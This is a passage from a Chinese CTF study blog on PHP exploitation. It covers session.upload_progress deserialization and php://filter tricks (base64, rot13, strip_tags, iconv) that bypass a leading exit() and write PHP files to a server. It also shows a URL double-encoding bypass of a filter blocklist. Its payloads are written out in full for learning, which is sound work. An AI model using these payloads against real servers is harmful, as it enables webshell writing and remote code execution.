<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>

<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
<p>开始解析：</p>
<ul>
<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
</ul>
<p>脚本后面补，遇到题再搓出来。</p>
<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>php反序列化</category>
        <category>session反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>filter过滤器利用总结</title>
    <url>/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
<span id="more"></span>

<h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
<p>基本格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource</td>
<td>在<code>php://filter</code>中，<code>resource</code>参数是必须的。<code>resource</code>用于指定<code>需要进行筛选过滤的数据流</code></td>
</tr>
<tr>
<td>read</td>
<td><code>read</code>参数指定<code>一个或多个过滤器</code>用于<code>读</code>操作，多个过滤器之间以管道符&#96;</td>
</tr>
<tr>
<td>write</td>
<td><code>write</code>参数指定<code>一个或多个过滤器</code>用于<code>写</code>操作，多个过滤器之间以管道符&#96;</td>
</tr>
<tr>
<td>无read或write为前缀</td>
<td>任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</td>
</tr>
</tbody></table>
<p>注意：任何没有与<code>read=</code>或<code>write=</code>作前缀的筛选器列表会<code>视情况应用于读或写操作</code>。这意味着在指定筛选器的过程中，<code>read</code>与<code>write</code>参数可被忽略。</p>
<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>以<code>file_get_contents()</code>函数为例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#flag&#123;123ahdiuahd&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#ZmxhZ3sxMjNhaGRpdWFoZH0=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#synt&#123;123nuqvhnuq&#125;</span></span><br></pre></td></tr></table></figure>

<p>以<code>file_put_contents()</code>函数为例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/resource=11.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#11.txt文件内容：hello world</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=convert.base64-encode/resource=12.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#12.txt文件内容：aGVsbG8gd29ybGQ=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=13.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#13.txt文件内容：uryyb jbeyq</span></span><br></pre></td></tr></table></figure>



<h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" alt="image-20240522172738818"></p>
<p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" alt="image-20240521145500302"></p>
<p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>

<p><strong>说明一下区别：</strong></p>
<ul>
<li><p>2和3区别： 为什么<code>&lt;haha</code>也会全部被删除，这是因为当调用<code>strip_tags()</code>时，它会执行以下操作，</p>
<p>（1）它会从左到右扫描字符串，找到第一个<code>&lt;</code>，</p>
<p>（2）继续扫描直到找到<code>&gt;</code>，<strong>在此过程中，所有字符都被认为是标签的一部分</strong>。</p>
<p>（3）移除标签：将<code>&lt;</code>和<code>&gt;</code>之间的所有内容删除。</p>
</li>
<li><p>2与3区别：</p>
</li>
<li></li>
</ul>
<p>清晰明了。</p>
<ul>
<li><p>4和5区别：空格位置不同导致结果也不同，这就有html中的标签和属性有关了，首先，标签名称不能包含空格，但是标签属性部分可以包含空格，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>则在这里:</p>
<p>（1）<code>&lt;a&gt;</code>是标签名称，表示一个超链接元素，</p>
<p>（2）<code>href=&quot;https://example.com&quot;</code> 是一个属性，指定链接的目标 URL。</p>
<p>（3）<code>target=&quot;_blank&quot;</code> 是另一个属性，指定链接打开的方</p>
</li>
</ul>
<p>所以标签名称前面是不能有空格的，后面有没有无所谓，就算有空格都只是被当做标签名称与属性分隔的地方。</p>
<p><strong>这里一定要注意：</strong></p>
<ul>
<li><p><code>&lt;</code>对应<code>&gt;</code>代表结束，<code>&lt;?</code>一定要有<code>?&gt;</code>才代表结束</p>
</li>
<li><p>php元素（<code>&lt;?</code>）没有前面必须没有空格的说法，只要是这在这两个相对应的符号之间的内容全部都会被去除</p>
</li>
</ul>
<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*:"></a>convert.iconv.*:</h6><p>这个过滤器需要<code>php</code>支持<code>iconv</code>。而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
<p><code>iconv</code>——将字符串按要求的字符编码来转换</p>
<p><code>convert.iconv.*</code>有两种使用方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>

<p>可用的字符编码：（其他可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>

<p>等如压缩过滤器的其他过滤器的利用可以自己去看</p>
<h6 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h6><p>比如有的时候会对过滤器进行过滤，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); </span><br></pre></td></tr></table></figure>

<p><strong>此时有个小知识点</strong>：伪协议处理时会对过滤器<code>urldecode</code>过滤一次。</p>
<p>所以可以利用二次编码绕过，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</span><br></pre></td></tr></table></figure>

<p>可以直接在burp上使用<code>URL-encode all characters</code>对其进行URL全编码,主要是要将字符也编码。</p>
<p>并且在自己的搭建的环境也成功测试。</p>
<h3 id="利用编码解码来’模糊’代码"><a href="#利用编码解码来’模糊’代码" class="headerlink" title="利用编码解码来’模糊’代码"></a>利用编码解码来’模糊’代码</h3><p>这里以文件包含的<code>死亡exit()</code>绕过为例子，比如有下面的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。</p>
<p>但是注意，<code>file_put_content()</code>函数是可以使用php:&#x2F;&#x2F;filter，同时这里的<code>$_POST[&#39;filename&#39;]</code>是可以被控制为传入的参数为伪协议的，那么我们就可以在这里尝试做文章。</p>
<p>思路：只要将<code>content</code>前面部分的那段代码使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就行，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的。</p>
<h4 id="利用base64编码"><a href="#利用base64编码" class="headerlink" title="利用base64编码"></a>利用base64编码</h4><p>使用<code>php://filter</code>流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p><strong>核心原理</strong>：Base64编码中只包含64个可打印字符，而PHP在解码Base64时，遇到不在其中的字符时，将会跳过这些字符，键将合法字符组成一个进的字符串进行解码。</p>
<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>所以，当<code>$content</code>被加上了<code>&lt;?php  exit; ?&gt;</code>以后，当使用<code>php://filter/write=convert.base64-decode</code>对其解码，<strong>在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等字符会因为不符合base64编码的字符范围被忽略，所以最终被解码的字符仅有<code>phpexit</code>和我们传入的其他字符。</strong></p>
<p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
<p><strong>最后效果</strong></p>
<p>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" alt="image-20240521191114493"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" alt="image-20240521191420996"></p>
<h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
<p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
<p><strong>最后效果</strong></p>
<p>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" alt="image-20240521194945000"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" alt="image-20240521195044746"></p>
<p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
<h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，就可以利用<code>strip_tags</code>函数去除它，而<code>php://filter</code>是支持这个方法的，</p>
<p>已经阐述过<code>string.strip_tags</code>过滤器会过滤的东西，那么我们可以直接尝试这样构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>

<p><strong>最后效果</strong></p>
<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" alt="image-20240521201629726"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" alt="image-20240521201701528"></p>
<p><strong>这个方法的做题记录：</strong><br>写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
<h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br></pre></td></tr></table></figure>

<p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
<h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p><strong>首先有个知识点：</strong><code>=</code>在base64中的作用是填充，也就是意味着结束；在<code>=</code>的后面是不允许有其他任何字符的，否则会报错，并且这样会导致无法正常写入文件的。测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+=.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>运行过后没有写入文件，2.txt文件为空。再改一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>成功向2.txt文件写入东西</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" alt="image-20240522131121762"></p>
<p>确实存在这个问题，<strong>需要注意</strong></p>
<p>——————</p>
<p>常规可想到的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>

<p><code>content</code>拼接过后的内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>

<p>此时就有一个问题<strong>，<code>=</code>的问题</strong>，需要使用一个方法将其去掉这里考虑<code>string.strip_tags</code>过滤器，如下构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#注意，这里需要将&#x27;+&#x27;URL编码为%2B,防止被浏览器当做空格处理</span></span><br></pre></td></tr></table></figure>

<p>此时拼接后的语句可以**配合到php前后对应的标签被去除只剩下<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>**，再被base64解码形成想要执行的字符串并填入到文件中，如下测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>成功执行（生成了一个文件，文件名为<code>?&gt;PD9waHAgcGhwaW5mbygpOz8%2b.php</code>，但是没有内容），估计是系统问题</p>
<p>但是由于文件名不正常，想读就必须加上引号，但是在浏览器访问的时候访问不到看（引号问题），不好读，这里可以尝试将其改变为一个正常的文件名，这里采用<strong>伪目录的方法</strong>（这里将<code>resource</code>后面前面的base64字符和闭合的符号整体看做一个目录，但是由于没有这个目录，于是就撤回到了原目录，可以生成我们能够访问的文件名），于是构建如下payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../haha.php</span></span><br></pre></td></tr></table></figure>

<p>这样可以构建出haha.php，文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，原理我是get到了，但是本地搭没测试出来，怪，等有题的时候再试试。</p>
<h6 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h6><p>首先rot13编码不受限于<code>=</code>,并且条件同样为之前那个（<code>short_open_tag = off</code>），这样才不会被PHP识别为代码。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span></span><br><span class="line"></span><br><span class="line">content=php:<span class="comment">//filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span></span><br></pre></td></tr></table></figure>

<p><strong>对于第一个payload个人理解（重要，后面对于这种构造方法利用的比较多）</strong>：第一个payload将我们想要利用的字符串放进了了过滤器列表里面，个人猜测是php程序在运行这串代码时会找有没有这个过滤器，没有就直接跳过舍弃。</p>
<p>测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>

<p>最终结果：<br>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" alt="image-20240522194848128"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" alt="image-20240522194907522"></p>
<h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
<ul>
<li><strong>usc-2</strong></li>
</ul>
<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），<strong>也就是说构造的恶意代码的字节数需要是UCS-2中2的倍数</strong>，不然不能进行正常反转</p>
